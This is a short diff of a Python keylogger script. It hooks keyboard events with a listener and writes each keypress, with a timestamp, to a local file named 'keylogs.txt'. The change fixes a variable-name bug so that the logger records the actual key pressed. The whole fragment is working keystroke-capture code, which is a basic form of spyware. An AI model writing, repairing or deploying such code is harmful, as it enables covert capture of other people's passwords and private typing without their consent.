@@ -4,6 +4,6 @@ logging.basicConfig(filename=("keylogs.txt"),filemode="w",
                         datefmt='%d/%m/%Y %I:%M:%S %p',format='%(asctime)s:%(message)s',level=logging.DEBUG)
 
 def on_press(key):
-    logging.info(str(Key))
+    logging.info(str(key))
 with Listener(on_press=on_press) as listener:
     listener.join()
